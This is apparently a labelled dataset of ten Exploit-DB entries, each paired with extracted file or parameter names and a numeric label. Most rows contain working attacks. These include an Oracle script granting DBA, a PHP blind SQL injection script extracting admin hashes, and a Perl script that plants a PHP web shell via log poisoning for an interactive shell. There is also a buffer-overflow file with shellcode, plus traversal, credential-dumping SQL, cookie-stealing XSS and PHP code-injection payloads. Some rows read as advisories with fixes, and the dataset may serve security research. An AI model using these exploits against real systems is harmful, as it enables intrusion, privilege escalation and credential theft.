10266,"Oracle - ctxsys.drvxtabc.create_tables Evil Cursor --  -- ctxsys.drvxtabc.create_tablesV2.sql -- -- -- Oracle ctxsys.drvxtabc.create_tables exploit (9i/10g) -- Evil cursor technique -- -- Grant dba permission to unprivileged user --  --  -- REF: http://www.google.it/search?q=ctxsys.drvxtabc.create_tables --  -- AUTHOR: Andrea ""bunker"" Purificato -- http://rawlab.mindcreations.com -- -- set serveroutput on; prompt [+] ctxsys-drvxtabc-create_tablesV2.sql exploit prompt [+] by Andrea ""bunker"" Purificato - http://rawlab.mindcreations.com prompt [+] 37F1 A7A1 BB94 89DB A920 3105 9F74 7349 AF4C BFA2 prompt  undefine the_user; accept the_user char prompt 'Target username (default TEST): ' default 'TEST'; prompt prompt [-] Creating evil cursor...  DECLARE MYC NUMBER; BEGIN MYC := DBMS_SQL.OPEN_CURSOR; DBMS_SQL.PARSE(MYC,'declare pragma autonomous_transaction;begin execute immediate ''GRANT DBA TO &the_user'';commit;end;',0); ctxsys.drvxtabc.create_tables(''||user||'"".""x"" as select * from dual where dbms_sql.execute('||MYC||')=0--','x',2); END; /  prompt [-] YOU GOT THE POWAH!!",['ctxsys.drvxtabc.create_tables'],1
44183,"Asterisk chan_pjsip 15.2.0 - 'SDP fmtp' Denial of Service ''' # Segmentation fault occurs in asterisk with an invalid SDP fmtp attribute  - Authors:     - Alfred Farrugia <alfred@enablesecurity.com>     - Sandro Gauci <sandro@enablesecurity.com> - Latest vulnerable version: Asterisk 15.2.0 running `chan_pjsip` - References: AST-2018-003 - Enable Security Advisory: <https://github.com/EnableSecurity/advisories/tree/master/ES2018-02-asterisk-pjsip-sdp-invalid-fmtp-segfault/> - Vendor Advisory: <http://downloads.asterisk.org/pub/security/AST-2018-003.html> - Timeline:     - Issue reported to vendor: 2018-01-15     - Vendor patch made available to us: 2018-02-05     - Vendor advisory published: 2018-02-21     - Enable Security advisory: 2018-02-22   ## Description  A specially crafted SDP message body with an invalid fmtp attribute causes a segmentation fault in asterisk using `chan_pjsip`.   ## Impact  Abuse of this vulnerability leads to denial of service in Asterisk when `chan_pjsip` is in use.   ## How to reproduce the issue  The following SIP message was used to reproduce the issue:  ``` INVITE sip:5678@127.0.0.1:5060 SIP/2.0 To: <sip:5678@127.0.0.1:5060> From: Test <sip:5678@127.0.0.1:5060> Call-ID: adc9caea-2d0a-40af-9de5-1dd21387e03a CSeq: 2 INVITE Via: SIP/2.0/UDP 172.17.0.1:10394;branch=z9hG4bKadc9caea-2d0a-40af-9de5-1dd21387e03a Contact: <sip:5678@172.17.0.1> Content-Type: application/sdp Content-Length: 228  v=0 o=- 1061502179 1061502179 IN IP4 172.17.0.1 s=Asterisk c=IN IP4 172.17.0.1 t=0 0 m=audio 17000 RTP/AVP 9 0 101 a=rtpmap:8 alaw/8000 a=rtpmap:0 PCMU/8000 a=rtpmap:101 telephone-event/8000 a=fmtp\x00:101 0-16 a=sendrecv ```  Notes:   - `\x00` should be replaced by the null character - authentication may be required  - the destination SIP address should match a valid extension in the dialplan.  To facilitate this process we wrote the following python program to reproduce this issue: '''  python import socket import re import md5 import uuid  SERVER_IP = ""127.0.0.1"" SERVER_PORT = 5060 UDP_IP = ""0.0.0.0"" UDP_PORT = 13940 USERNAME = ""5678"" PASSWORD = ""5678"" INVITE_USERNAME = ""5678""  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock.bind((UDP_IP, UDP_PORT))  callid = str(uuid.uuid4())  sdpbody = ""v=0\r\no=- 1061502179 1061502179 IN IP4 172.17.0.1\r\n"" \     ""s=Asterisk\r\n"" \     ""c=IN IP4 172.17.0.1\r\n"" \     ""t=0 0\r\n"" \     ""m=audio 17000 RTP/AVP 9 0 101\r\n"" \     ""a=rtpmap:8 alaw/8000\r\n"" \     ""a=rtpmap:0 PCMU/8000\r\n"" \     ""a=rtpmap:101 telephone-event/8000\r\n"" \     ""a=fmtp\x00:101 0-16\r\n""\     ""a=sendrecv""  msg=""INVITE sip:%s@%s:%i SIP/2.0\r\n"" \     ""To: <sip:%s@%s:%i>\r\n"" \     ""From: Test <sip:%s@%s:%s>\r\n"" \     ""Call-ID: %s\r\n"" \     ""CSeq: 2 INVITE\r\n"" \     ""Via: SIP/2.0/UDP 172.17.0.1:10394;branch=z9hG4bK%s\r\n"" \     ""Contact: <sip:%s@172.17.0.1>\r\n"" \     ""Content-Type: application/sdp\r\n"" \     ""{{AUTH}}"" \     ""Content-Length: %i\r\n"" \     ""\r\n"" % (         INVITE_USERNAME, SERVER_IP, SERVER_PORT,         INVITE_USERNAME, SERVER_IP, SERVER_PORT,         USERNAME, SERVER_IP, SERVER_PORT,         callid, callid,         USERNAME, len(sdpbody)         ) + \     sdpbody  sock.sendto(msg.replace(""{{AUTH}}"", """"), (SERVER_IP, SERVER_PORT))  data, addr = sock.recvfrom(10240)  if data.startswith(""SIP/2.0 401""):     for line in data.split('\r\n'):         if line.startswith(""WWW-Authenticate""):             content = line.split(':', 2)[1].strip()             realm = re.search(""realm=\""([a-z]+)\"""", content).group(1)             nonce = re.search(""nonce=\""([a-z0-9\/]+)\"""", content).group(1)             ha1 = md5.new(USERNAME + "":"" + realm + "":"" + PASSWORD).hexdigest()             uri = ""sip:%s:%i"" % (SERVER_IP, SERVER_PORT)             ha2 = md5.new(""INVITE:"" + uri).hexdigest()             r = md5.new(ha1 + "":"" + nonce + "":"" + ha2).hexdigest()              auth = ""Authorization: Digest username=\""%s\"","" % (USERNAME) + \                 ""realm=\""%s\"","" % (realm) + \                 ""nonce=\""%s\"","" % (nonce) + \                 ""uri=\""%s\"","" % (uri) + \                 ""response=\""%s\"","" % (r) + \                 ""algorithm=md5\r\n""  sock.sendto(msg.replace(""{{AUTH}}"", auth), (SERVER_IP, SERVER_PORT))  ''' This security issue was discovered through the use of simple fuzzing with [Radamsa](https://github.com/aoh/radamsa) and our internal toolset.  ### GDB backtrace result  ``` Thread 197 ""asterisk"" received signal SIGSEGV, Segmentation fault. [Switching to Thread 0x7fff65e57700 (LWP 10595)] pjmedia_sdp_attr_get_fmtp (attr=<optimized out>, fmtp=fmtp@entry=0x7fff65e56430) at ../src/pjmedia/sdp.c:350 350	    while (pj_isdigit(*p) && p!=end) (gdb) bt #0  pjmedia_sdp_attr_get_fmtp (attr=<optimized out>, fmtp=fmtp@entry=0x7fff65e56430) at ../src/pjmedia/sdp.c:350 #1  0x00007fff6bf49070 in get_codecs (session_media=0x7fff74799540, codecs=0x7fff65e56450, stream=0x7fff97f99de0, session=0x7fff74581688) at res_pjsip_sdp_rtp.c:276 #2  set_caps (session=session@entry=0x7fff74581688, session_media=session_media@entry=0x7fff74799540, session_media_transport=0x7fff74799540, stream=stream@entry=0x7fff97f99de0, is_offer=is_offer@entry=1, asterisk_stream=asterisk_stream@entry=0x7fff747a03b0)     at res_pjsip_sdp_rtp.c:352 #3  0x00007fff6bf4b2d7 in negotiate_incoming_sdp_stream (session=0x7fff74581688, session_media=0x7fff74799540, sdp=<optimized out>, index=<optimized out>, asterisk_stream=0x7fff747a03b0) at res_pjsip_sdp_rtp.c:1185 #4  0x00007ffff1a16bb9 in handle_incoming_sdp (session=session@entry=0x7fff74581688, sdp=0x7fff97f99870) at res_pjsip_session.c:671 #5  0x00007ffff1a1a721 in new_invite (invite=<synthetic pointer>) at res_pjsip_session.c:2871 #6  handle_new_invite_request (rdata=0x7fff573f88d8) at res_pjsip_session.c:2966 #7  session_on_rx_request (rdata=0x7fff573f88d8) at res_pjsip_session.c:3030 #8  0x00007ffff7868df7 in pjsip_endpt_process_rx_data (endpt=<optimized out>, rdata=rdata@entry=0x7fff573f88d8, p=p@entry=0x7ffff1a0ace0 <param>, p_handled=p_handled@entry=0x7fff65e56d44) at ../src/pjsip/sip_endpoint.c:887 #9  0x00007ffff17e009f in distribute (data=0x7fff573f88d8) at res_pjsip/pjsip_distributor.c:903 #10 0x00000000005fb3be in ast_taskprocessor_execute (tps=tps@entry=0x1dc33a8) at taskprocessor.c:963 #11 0x0000000000602610 in execute_tasks (data=0x1dc33a8) at threadpool.c:1322 #12 0x00000000005fb3be in ast_taskprocessor_execute (tps=0x1a39488) at taskprocessor.c:963 #13 0x0000000000602af0 in threadpool_execute (pool=0x1a37ca8) at threadpool.c:351 #14 worker_active (worker=0x7fff9457ccd8) at threadpool.c:1105 #15 worker_start (arg=arg@entry=0x7fff9457ccd8) at threadpool.c:1024 #16 0x000000000060d4bd in dummy_start (data=<optimized out>) at utils.c:1257 #17 0x00007ffff5e3d6ba in start_thread (arg=0x7fff65e57700) at pthread_create.c:333 #18 0x00007ffff54263dd in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109 (gdb)  ```   ## Solutions and recommendations  Apply the patch issued by Asterisk at <http://www.asterisk.org/security> or upgrade to the latest release.  ## About Enable Security  [Enable Security](https://www.enablesecurity.com) provides Information Security services, including Penetration Testing, Research and Development, to help protect client networks and applications against online attackers.  ## Disclaimer  The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information. '''","[""'SDP fmtp'"", 'fmtp']",1
18185,"Muster Render Farm Management System - Arbitrary File Download #Name: Muster Render Farm Management System Arbitrary File Download  #Vendor Website : http://www.vvertex.com/muster.html  #Date Released : November 29, 2011  #Affected Software : Muster < 6.20  #Researcher : Nick Freeman (nick.freeman@security-assessment.com)  #Description #Security-Assessment.com has discovered a vulnerability with the Muster 6.1.6 web management server. This issue #can be exploited by an unauthenticated user to gain full control of the web management interface, and to send #arbitrary commands to all Muster clients.  #Exploitation #It is possible to download any file on the Muster server by exploiting a vulnerability in the web server. By #using directory traversal characters (\..\..\) in the URL, it is possible to specify any file on the file #system to be served to the client. Exploitation of this vulnerability does not require authentication. The #table below includes an example HTTP Request that would allow the download of the “muster.db” SQLite database:  #Example of Malicious HTTP Request :  GET /a\..\..\muster.db  HTTP/1.1 Host: musterserver:8690     #This SQLite database contains a table with all users of the application together with base64-encoded #passwords. By retrieving this database or other similar configuration files, it is possible to gain #administrative access over the render farm.   #Solution #A patch is available from the vendor’s website. Version 6.20 remediates this vulnerability.",['muster.db”'],0
36910,Open Realty 2.5.x - 'select_users_template' Local File Inclusion source: https://www.securityfocus.com/bid/52296/info  Open Realty is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this vulnerability to obtain potentially sensitive information or to execute arbitrary local scripts in the context of the webserver process. This may allow the attacker to compromise the application and the computer; other attacks are also possible.  Open Realty version 2.5.8 is vulnerable; other versions may also be affected.   http://www.example.com/open-realty2.5.8/?select_users_template=../../../../../../../../../../../../../../../etc/passwd%00,"[""'select_users_template'""]",1
40733,"WordPress Plugin WassUp Real Time Analytics 1.9 - Persistent Cross-Site Scripting Source: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_in_wassup_real_time_analytics_wordpress_plugin.html  Persistent Cross-Site Scripting in WassUp Real Time Analytics WordPress Plugin  Abstract  A stored Cross-Site Scripting (XSS) vulnerability has been found in the WassUp Real Time Analytics WordPress Plugin. By using this vulnerability an attacker can inject malicious JavaScript code into the application, which will execute within the browser of any user who views the Activity Log, in general WP admin.  Contact  For feedback or questions about this advisory mail us at sumofpwn at securify.nl  The Summer of Pwnage  This issue has been found during the Summer of Pwnage hacker event, running from July 1-29. A community summer event in which a large group of security bughunters (worldwide) collaborate in a month of security research on Open Source Software (WordPress this time). For fun. The event is hosted by Securify in Amsterdam.  OVE ID  OVE-20160717-0002  Tested versions  This issue was successfully tested on WassUp Real Time Analytics version 1.9.  Fix  This issue has been fixed in version 1.9.1.  Introduction  The WassUp Real Time Analytics WordPress plugin can be used to analyze visitors' traffic with real-time statistics.  Details  A stored Cross-Site Scripting vulnerability was found in the Wassup WordPress plugin. This issue allows an attacker to perform a wide variety of actions, such as stealing Administrators' session tokens, or performing arbitrary actions on their behalf. Particularly interesting about this issue is that an anonymous user can simply store his XSS payload in the Admin dashboard by just visiting the public site with a malformed link.  The malicious script code can be sent by anyone visiting the website (unauthenticated). The malicious code is then executed in the admin panel under section 'Current Visitors' of the Wassup plugin page.  The issue exists in the file wassup.php and is caused by the lack of output encoding on the request-uri parameter. The vulnerable code is listed below.  </span><span class=""request-uri""><?php echo wassupURI::url_link  and in the file wassup.class.php:  else $urllink='<a href=""'.self::add_siteurl(""$urlrequested"").'"" target=""_BLANK"">'.stringShortener(""$urlrequested"",$chars).'</a>'; return $urllink;  Proof of concept  1. Log in as admin and empty the log data of Wassup for a clean test -> http://<targetsite>/wp-admin/admin.php?page=wassup-options -> Manage Files and Data -> Empty table  2. Open Burp Suite and sent the following requests one after another:  GET /test HTTP/1.1 Host: <targetsite>  GET ///--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(70,70,70))</SCRIPT> HTTP/1.1 Host: <targetsite>  3. Open the Current Visitors Online page as an admin: http://<targetsite>/wp-admin/admin.php?page=wassup-online  Note: Your request should be detected as a Spider/Bot by the Wassup plugin. One way to do this is by sending the requests above through Burp Suite.","['wassup.php ', 'admin.php?']",1
4798,"ZeusCMS 0.3 - Blind SQL Injection <?  /* 	------------------------------------------------- 	ZeusCMS <= 0.3 Remote Blind SQL Injection Exploit 	-------------------------------------------------  	 	author...: EgiX 	mail.....: n0b0d13s[at]gmail[dot]com 	 	link.....: http://www.zeuscms.gr/ 	details..: works with magic_quotes_gpc = off (if magic quotes affects also $_SERVER array)  	[-] Blind SQL Injection in /index.php :  	129.	$blockedRefCheck=security::checkRef($_SERVER[""HTTP_REFERER""]); <== 	130.	 	131.	if(@in_array($_SERVER['REMOTE_ADDR'],$blockedips) || $blockedRefCheck==TRUE){ 	132.		include ""html_files/denied.html""; 	133.	} 	134.	else  	[-] checkRef() function defined in /security.php :  	130.	function checkref($ref){ 	131.	  if($ref){ 	132.		$res=eregi_replace(""http://"","""",$ref); 	133.		include ""dbase.php""; 	134.		$table=$prefix.""referers""; 	135.		$res=$db->query(""SELECT * FROM $table WHERE url like '%$ref%' AND status='BLOCKED'""); <== 	136.		if($res->numRows()>0){ 	137.			return true; 	138.		} 	139.		else{ 	140.			return false; 	141.		} 	142.		}else{ 	143.      return false; 	144.    }  	an attacker can inject sql code through http referer header, that isn't properly checked...  	[*] Possible bug fix in /index.php :  	128.	$ref = security::safeGet($_SERVER[""HTTP_REFERER""]); 	129.	$blockedRefCheck = security::checkRef($ref);  	[-] there is also a possible file system browsing through /image_viewer.php, p.o.c. : 	 	http://[host]/[path]/image_viewer.php?dir=/ */  error_reporting(0); ini_set(""default_socket_timeout"", 5); set_time_limit(0);  function http_send($host, $packet) { 	$sock = fsockopen($host, 80); 	while (!$sock) 	{ 		print ""\n[-] No response from {$host}:80 Trying again...""; 		$sock = fsockopen($host, 80); 		sleep(1); 	} 	fputs($sock, $packet); 	$resp = """"; 	while (!feof($sock)) $resp .= fread($sock, 1); 	fclose($sock); 	return $resp; }  function check_query($sql) { 	global $host, $path; 	 	$packet = ""GET {$path} HTTP/1.1\r\n""; 	$packet.= ""Host: {$host}\r\n""; 	$packet.= ""Referer: {$sql} \r\n""; 	$packet.= ""Keep-Alive: 300\r\n""; 	$packet.= ""Connection: keep-alive\r\n\r\n""; 	$html	= http_send($host, $packet); 	 	return (preg_match(""/DENIED/"", $html) ? true : false); }  print ""\n+-----------------------------------------------------------+""; print ""\n| ZeusCMS <= 0.3 Remote Blind SQL Injection Exploit by EgiX |""; print ""\n+-----------------------------------------------------------+\n"";  if ($argc < 3) { 	print ""\nUsage......:	php $argv[0] host path [prefix] [userid]\n""; 	print ""\nhost.......:	target server (ip/hostname)""; 	print ""\npath.......:	path to ZeusCMS directory (example: / or /zeuscms/)""; 	print ""\nprefix.....:	table's prefix (default: ze)""; 	print ""\nuserid.....:	user id (default: 1 - admin)\n""; 	die(); }  $host = $argv[1]; $path = $argv[2]; $pre  = (isset($argv[3]) ? $argv[3] : ""ze""); $uid  = (isset($argv[4]) ? $argv[4] : ""1"");  $hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102); $index = 1; $md5 = """"; print ""\n[-] MD5 Hash: "";  while (!strpos($md5, chr(0))) { 	for ($i = 0; $i <= count($hash); $i++) 	{   		if ($i == count($hash)) die(""\n[-] Exploit failed...\n"");  		$sql =	""%'/**/AND/**/id=-1/**/UNION/**/SELECT/**/pwd,1,1,1/**/FROM/**/{$pre}_users/**/"" . 			""WHERE/**/id={$uid}/**/AND/**/ORD(SUBSTR(pwd,{$index},1))={$hash[$i]}/*"";  		if (check_query($sql)) { $md5 .= chr($hash[$i]); print chr($hash[$i]); break; } 	}  	$index++; }  $char = array(0); // null char for ($j = 97; $j <= 122; $j++) $char = array_merge($char, array($j)); // a-z for ($j = 65; $j <= 90; $j++) $char = array_merge($char, array($j)); // A-Z for ($j = 48; $j <= 57; $j++) $char = array_merge($char, array($j)); // 0-9  $index = 1; $user = """"; print ""\n[-] Username: "";  while (!strpos($user, chr(0))) { 	for ($i = 0; $i <= count($char); $i++) 	{   		if ($i == count($char)) die(""\n[-] Exploit failed...\n"");  		$sql =	""%'/**/AND/**/id=-1/**/UNION/**/SELECT/**/nickname,1,1,1/**/FROM/**/{$pre}_users/**/"" . 			""WHERE/**/id={$uid}/**/AND/**/ORD(SUBSTR(nickname,{$index},1))={$char[$i]}/*"";  		if (check_query($sql)) { $user .= chr($char[$i]); print chr($char[$i]); break; } 	}  	$index++; }  print ""\n\n[-] Successfull!\n"";  ?>  # milw0rm.com [2007-12-27]","['viewer.php,']",1
31652,amfPHP 1.2 - '/browser/code.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/28789/info   Amfphp is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.   Attackers may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow attackers to steal cookie-based authentication credentials and to launch other attacks.   Amfphp 1.2 is vulnerable; other versions may also be affected.   http://www.example.com/amfphp/browser/code.php?class=[xss] http://www.example.com/amfphp/browser/code.php?action=&codeType=&class=[xss]&location=[xss],"[""'/browser/code.php'""]",1
22652,"Zoner Photo Studio 15 Build 3 - 'Zps.exe' Registry Value Parsing #!/usr/bin/python   # Exploit Title: Zoner Photo Studio v15 Build 3 (Zps.exe) Registry Value Parsing Local Buffer Overflow # Version:       15 Build 3, Build 2 # Date:          2012-11-09 # Author:        Julien Ahrens # Homepage:      http://www.inshell.net # Software Link: http://www.zoner.com # Tested on:     Windows XP SP3 Professional German # Notes:         - # Howto:         Import Reg -> Start App  from struct import pack  file=""poc.reg""  junk1=""\xCC"" * 2136 nseh=""\xeb\x06\x90\x90"" eip=pack('<L',0x0C7D8F13) # JMP DWORD PTR SS:[EBP-18] - Access: (PAGE_READWRITE) [SafeSEH Bypass] nops=""\x90"" * 10  junk2=""\xCC"" * 1000  # windows/exec CMD=calc.exe  # Encoder: x86/shikata_ga_nai # powered by Metasploit  # msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00\x0a\x0d\x22\x93'  shellcode = (""\xbd\x55\xd9\x54\xcd\xdb\xdc\xd9\x74\x24\xf4\x5a\x33\xc9"" + ""\xb1\x33\x31\x6a\x12\x03\x6a\x12\x83\x97\xdd\xb6\x38\xeb"" + ""\x36\xbf\xc3\x13\xc7\xa0\x4a\xf6\xf6\xf2\x29\x73\xaa\xc2"" + ""\x3a\xd1\x47\xa8\x6f\xc1\xdc\xdc\xa7\xe6\x55\x6a\x9e\xc9"" + ""\x66\x5a\x1e\x85\xa5\xfc\xe2\xd7\xf9\xde\xdb\x18\x0c\x1e"" + ""\x1b\x44\xff\x72\xf4\x03\x52\x63\x71\x51\x6f\x82\x55\xde"" + ""\xcf\xfc\xd0\x20\xbb\xb6\xdb\x70\x14\xcc\x94\x68\x1e\x8a"" + ""\x04\x89\xf3\xc8\x79\xc0\x78\x3a\x09\xd3\xa8\x72\xf2\xe2"" + ""\x94\xd9\xcd\xcb\x18\x23\x09\xeb\xc2\x56\x61\x08\x7e\x61"" + ""\xb2\x73\xa4\xe4\x27\xd3\x2f\x5e\x8c\xe2\xfc\x39\x47\xe8"" + ""\x49\x4d\x0f\xec\x4c\x82\x3b\x08\xc4\x25\xec\x99\x9e\x01"" + ""\x28\xc2\x45\x2b\x69\xae\x28\x54\x69\x16\x94\xf0\xe1\xb4"" + ""\xc1\x83\xab\xd2\x14\x01\xd6\x9b\x17\x19\xd9\x8b\x7f\x28"" + ""\x52\x44\x07\xb5\xb1\x21\xf7\xff\x98\x03\x90\x59\x49\x16"" + ""\xfd\x59\xa7\x54\xf8\xd9\x42\x24\xff\xc2\x26\x21\xbb\x44"" + ""\xda\x5b\xd4\x20\xdc\xc8\xd5\x60\xbf\x8f\x45\xe8\x6e\x2a"" + ""\xee\x8b\x6e"")  poc=""Windows Registry Editor Version 5.00\n\n"" poc=poc + ""[HKEY_CURRENT_USER\Software\ZONER\Zoner Photo Studio 15\Preferences\Certificate]\n"" poc=poc + ""\""Issuer\""=\"""" + junk1 + nseh + eip + nops + shellcode + junk2 + ""\""""  try:     print ""[*] Creating exploit file...\n"";     writeFile = open (file, ""w"")     writeFile.write( poc )     writeFile.close()     print ""[*] File successfully created!""; except:     print ""[!] Error while creating file!"";","[""'Zps.exe'""]",1
4794,"XZero Community Classifieds 4.95.11 - Local File Inclusion / SQL Injection #!/usr/bin/perl # # XZero Community Classifieds  <= v4.95.11 LFI & SQL Injection # linK : http://www.xzeroscripts.com # download: http://rapidshare.com/files/66809648/XZCl4.95.11.rar # original thread: http://en.rstzone.org/xzero-community-classifieds-v4-95-11-lfi-sql-in-t9394.rst # (c)od3d and f0unded by Kw3rLn from Romanian Security Team a.K.A http://rstzone.org # # Local file inclusion in index.php: # #  switch($xview) #        { #                      [ ..... ] #            case ""page""            : $page = ""$_GET[pagename].php"";    break; #               [ ..... ] #        } # #  include_once($page); # in common.inc.php line 40: $xview = $_GET['view'] ? $_GET['view'] : ""main""; # # SQL Injection in post.php # line 511: $sql = ""SELECT expireafter FROM $t_subcats WHERE subcatid = $_REQUEST[subcatid]""; # ( And more but useless cuz admin password is in config.inc.php) # # LFI: http://site.com/index.php?view=page&pagename=[Local_FIle]%00 # Example: http://www.diasporaromana.com/index.php?view=page&pagename=tetete # # SQL: http://site.com/index.php?view=post&cityid=2&lang=en&catid=2&subcatid=[SQL] # Example: http://www.diasporaromana.com/index.php?view=post&cityid=220&lang=en&catid=5&subcatid=18' # # And now exploit for LFI  use IO::Socket; use LWP::Simple;   @apache=( ""../../../../../var/log/httpd/access_log"", ""../../../../../var/log/httpd/error_log"", ""../apache/logs/error.log"", ""../apache/logs/access.log"", ""../../apache/logs/error.log"", ""../../apache/logs/access.log"", ""../../../apache/logs/error.log"", ""../../../apache/logs/access.log"", ""../../../../apache/logs/error.log"", ""../../../../apache/logs/access.log"", ""../../../../../apache/logs/error.log"", ""../../../../../apache/logs/access.log"", ""../logs/error.log"", ""../logs/access.log"", ""../../logs/error.log"", ""../../logs/access.log"", ""../../../logs/error.log"", ""../../../logs/access.log"", ""../../../../logs/error.log"", ""../../../../logs/access.log"", ""../../../../../logs/error.log"", ""../../../../../logs/access.log"", ""../../../../../etc/httpd/logs/access_log"", ""../../../../../etc/httpd/logs/access.log"", ""../../../../../etc/httpd/logs/error_log"", ""../../../../../etc/httpd/logs/error.log"", ""../../.. /../../var/www/logs/access_log"", ""../../../../../var/www/logs/access.log"", ""../../../../../usr/local/apache/logs/access_log"", ""../../../../../usr/local/apache/logs/access.log"", ""../../../../../var/log/apache/access_log"", ""../../../../../var/log/apache/access.log"", ""../../../../../var/log/access_log"", ""../../../../../var/www/logs/error_log"", ""../../../../../var/www/logs/error.log"", ""../../../../../usr/local/apache/logs/error_log"", ""../../../../../usr/local/apache/logs/error.log"", ""../../../../../var/log/apache/error_log"", ""../../../../../var/log/apache/error.log"", ""../../../../../var/log/ access_log"", ""../../../../../var/log/error_log"" );  print ""[RST] XZero Community Classifieds <= v4.95.11 Remote Command Execution Exploit\n""; print ""[RST] need magic_quotes_gpc = off\n""; print ""[RST] c0ded by Kw3rLN from Romanian Security Team [ http://rstzone.org ] \n\n"";   if (@ARGV < 3) {     print ""[RST] Usage: xzero.pl [host] [path] [apache_path]\n\n"";     print ""[RST] Apache Path: \n"";     $i = 0;     while($apache[$i])     { print ""[$i] $apache[$i]\n"";$i++;}     exit(); }  $host=$ARGV[0]; $path=$ARGV[1]; $apachepath=$ARGV[2];  print ""[RST] Injecting some code in log files...\n""; $CODE=""<?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?>""; $socket = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$host"", PeerPort=>""80"") or die ""[RST] Could not connect to host.\n\n""; print $socket ""GET "".$path.$CODE."" HTTP/1.1\r\n""; print $socket ""User-Agent: "".$CODE.""\r\n""; print $socket ""Host: "".$host.""\r\n""; print $socket ""Connection: close\r\n\r\n""; close($socket); print ""[RST] Shell!! write q to exit !\n""; print ""[RST] IF not working try another apache path\n\n"";  print ""[shell] "";$cmd = <STDIN>;  while($cmd !~ ""q"") {     $socket = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$host"", PeerPort=>""80"") or die ""[RST] Could not connect to host.\n\n"";      print $socket ""GET "".$path.""index.php?view=page&pagename="".$apache[$apachepath].""%00&cmd=$cmd HTTP/1.1\r\n"";     print $socket ""Host: "".$host.""\r\n"";     print $socket ""Accept: */*\r\n"";     print $socket ""Connection: close\r\n\n"";      while ($raspuns = <$socket>)     {         print $raspuns;     }     print ""[shell] "";     $cmd = <STDIN>; }  # milw0rm.com [2007-12-26]",['index.php:'],1
34189,"Sphider Search Engine 1.3.6 - Multiple Vulnerabilities # Exploit Title: Sphider 1.3.6 or later SQL Injection # Google Dork: intitle:""Sphider Admin Login"" # Date: 1 July 2014 # Exploit Author: Mike Manzotti # Vendor Homepage: http://www.sphider.eu/ # Software Link: http://www.sphider.eu/sphider-1.3.6.zip # Version: v 1.3.6  Description: The web application is vulnerable to SQLi. Once a website has been indexed with Sphider, an attacker can inject SQL under Sites -> Browser pages-> filter option.  Proof of Concept: Response: POST: /admin/admin.php per_page=10&filter='union+select+1,@@version+;#&start=1&site_id=1&f=21  Response: <tr class=""grey""> <td><a href=""5.5.35-0+wheezy1"">5.5.35-0+wheezy1</a></td> <td width=""8%""> [cid:image001.jpg@01CFAA73.0B6B8330]    # Exploit Title: Sphider 1.3.6 or later PHP Injection  Description: An authenticated user can inject PHP code in configuration settings. This would allow an attacker to take full control of the server. Note that in v1.3.5 authentication can be bypassed. Also note that this issue depends on permissions of ""conf.php file"". However during the installation the user is advised to change the permissions of ""conf.php"" file to chmod 666.  Proof of Concept: Request: POST /admin/admin.php f=settings&Submit=1&_version_nr=1.3.5&_language=en&_template=standard&_admin_email=admin%40localhost&_print_results=1&_tmp_dir=tmp&_log_dir=log&_log_format=html&_min_words_per_page=10&_min_word_length=3&_word_upper_bound=100;system($_POST[cmd])&_index_numbers=1&_index_meta_keywords=1&_pdftotext_path=c%3A%5Ctemp%5Cpdftotext.exe&_catdoc_path=c%3A%5Ctemp%5Ccatdoc.exe&_xls2csv_path=c%3A%5Ctemp%5Cxls2csv&_catppt_path=c%3A%5Ctemp%5Ccatppt&_user_agent=Sphider&_min_delay=0&_strip_sessids=1&_results_per_page=10&_cat_columns=2&_bound_search_result=0&_length_of_link_desc=0&_links_to_next=9&_show_meta_description=1&_show_query_scores=1&_show_categories=1&_desc_length=250&_did_you_mean_enabled=1&_suggest_enabled=1&_suggest_history=1&_suggest_rows=10&_title_weight=20&_domain_weight=60&_path_weight=10&_meta_weight=5  ""system($_POST[cmd])"" has been injected.  Request: POST http://URL/sphider/settings/conf.php cmd=pwd  Response: /var/www/sphider/settings   # Exploit Title: Sphider 1.3.6 or later Stored and Reflected XSS  Description: The web application is prone to Stored and Reflected Cross site scripting.  Stored XSS: Request: POST /admin/admin.php f=7&parent=&category=<script>alert(document.cookie)</script>  Response <a href=""admin.php?f=edit_cat&cat_id=1""> <script>alert(document.cookie) </script> </a>  Reflected XSS:  Request: POST /sphider/admin/admin.php f=index&adv=1&url=""/><script>alert(document.cookie)</script>  Response: <a href=""admin.php?f=edit_cat&cat_id=1""> <script>alert(document.cookie) </script> </a>   Solution: Currently none. The author has been informed.  Timeline: 1 July 2014: The author has been informed 28 July 2014: Vulnerability published",['conf.php '],1
5139,"Mambo Component Portfolio Manager 1.0 - 'categoryId' SQL Injection ######################################################### ## ##  Mambo component Portfolio Manager 1.0 (com_portfolio) ## ## ##  Author: it's my ## ##  Home page: http://www.antichat.ru ## ######################################################### ## ## Dork: inurl:""index.php?option=com_portfolio"" ## #########################################################        Exploit:  http://site.com/index.php?option=com_portfolio&memberId=9&categoryId=-1+union+select+1,2,3,concat(username,0x3a,password),5,6,7,8,9,10,11,12+from+mos_users/*  ######################################################### ## it's my sick world =/   ####    www.antichat.ru #########################################################        <name>portfolio</name>     <creationDate>2005.09.15</creationDate>     <author>Garry Malhi</author>     <copyright>This component  is released under the GNU/GPL License</copyright>     <authorEmail></authorEmail>     <authorUrl></authorUrl>      <version>1.0</version>     <description>Portfolio Manager Component</description>  # milw0rm.com [2008-02-18]","[""'categoryId'""]",1
